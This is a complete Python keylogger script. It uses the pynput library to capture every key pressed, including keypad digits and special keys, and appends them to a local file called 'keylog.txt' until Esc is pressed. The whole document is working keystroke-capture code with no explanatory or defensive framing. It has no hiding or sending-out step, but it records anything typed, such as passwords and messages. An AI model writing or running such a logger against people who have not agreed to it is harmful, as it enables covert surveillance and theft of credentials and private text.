from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        key_str = ""
        
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
            
        elif hasattr(key, 'vk'):
            vk = key.vk
            if 96 <= vk <= 105:  
                key_str = str(vk - 96) 
            else:
                key_str = f"[{key.vk}]" 
     
        elif hasattr(key, 'name'):
            if key.name == 'space':
                key_str = ' '
            elif key.name == 'enter':
                key_str = '\n'
            else:
                key_str = f"[{key.name}]"
        
       
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(key_str)
            
    except Exception:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()